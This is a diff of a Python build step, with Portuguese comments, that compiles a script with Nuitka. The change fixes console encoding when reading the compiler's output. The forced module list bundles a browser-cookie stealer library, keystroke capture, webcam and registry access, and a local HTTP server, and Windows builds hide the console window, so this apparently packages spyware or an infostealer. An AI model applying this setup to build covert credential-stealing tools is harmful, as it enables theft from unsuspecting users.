@@ -103,32 +103,41 @@ class NuitkaCompilation(CompilationStrategy):
         if context.config['platform'] == 'windows':
             command.append('--windows-disable-console')
         
-        # --- INÍCIO DA CORREÇÃO ---
-        # Usando a opção '--include-module', que é mais compatível com versões antigas do Nuitka,
-        # em vez de '--follow-imports-to'.
         modules_to_include = [
             'requests', 'psutil', 'cv2', 'pynput', 'browser_cookie3', 
-            'Cryptodome', 'PIL', 'numpy', 'win32', 'win32gui',  'sqlite3', 'http.server',
-            'winreg', 'threading'
+            'Cryptodome', 'PIL', 'numpy', 'win32', 'win32gui', 'sqlite3',
+            'http.server', 'winreg', 'threading'
         ]
         for module in modules_to_include:
-            command.append(f'--include-module={module}' )
-        # --- FIM DA CORREÇÃO ---
+            command.append(f'--include-module={module}')
 
         extra_args = context.config.get('extra_args', [])
         command.extend(extra_args)
 
         command.append(str(context.entry_script_path))
 
-        # A lógica de feedback em tempo real com Popen permanece a mesma
+        # Encoding do console do Windows (cp1252, cp850, etc.)
+        # Nuitka imprime paths usando esse encoding — não UTF-8.
+        # sys.stdout.encoding captura o encoding real do terminal;
+        # fallback para utf-8 em Linux/Mac onde nao ha esse problema.
+        _enc = sys.stdout.encoding or 'utf-8'
+
         try:
-            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8')
+            process = subprocess.Popen(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT
+                # SEM text=True / encoding — lemos bytes e decodificamos manualmente
+            )
             
             while True:
-                output = process.stdout.readline()
-                if output == '' and process.poll() is not None:
+                raw = process.stdout.readline()
+                # EOF + processo encerrado = fim do loop
+                if raw == b'' and process.poll() is not None:
                     break
-                if output:
+                if raw:
+                    # errors='replace' substitui bytes invalidos por '?' em vez de crashar
+                    output = raw.decode(_enc, errors='replace')
                     print(output.strip())
             
             return_code = process.poll()
@@ -136,7 +145,7 @@ class NuitkaCompilation(CompilationStrategy):
                 raise RuntimeError(f"Nuitka falhou com o código de retorno: {return_code}")
 
         except Exception as e:
-             raise RuntimeError(f"Falha ao executar o Nuitka: {e}")
+            raise RuntimeError(f"Falha ao executar o Nuitka: {e}")
             
         context.final_artifact_path = context.build_dir / "dist" / context.config["output"]
         return context
